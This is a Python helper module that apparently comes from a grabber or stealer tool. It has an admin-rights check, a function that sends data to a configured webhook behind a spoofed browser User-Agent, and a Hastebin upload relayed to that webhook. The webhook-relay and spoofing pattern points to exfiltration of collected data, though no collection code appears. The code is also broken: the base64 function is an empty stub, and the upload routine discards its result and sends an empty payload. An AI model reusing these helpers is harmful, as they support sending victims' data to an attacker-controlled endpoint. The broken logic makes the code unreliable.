import os
import PyUploads
from ctypes import windll
from random import randint
from json import dumps
from urllib.request import Request, urlopen


def spam():
    """anti spam"""
    return randint(0, 10000)


def convert_base64(default_string):
    """Convert a string to base64"""
    pass


def isAdmin():
    """Check if ran as admin"""
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def webhook_request(payload):
    """Sends request to webhook server"""
    from modules.config import WEBHOOK_URL
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }


    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except Exception as e:
        print(e)
        
def upload_haste(content):
    """Uploads to hastebin"""
    try:
        PyUploads.Hastebin.Create(content)
        payload = ""
        content = payload
        webhook_request(payload)
    except PyUploads.Exceptions.CreationError:
        pass
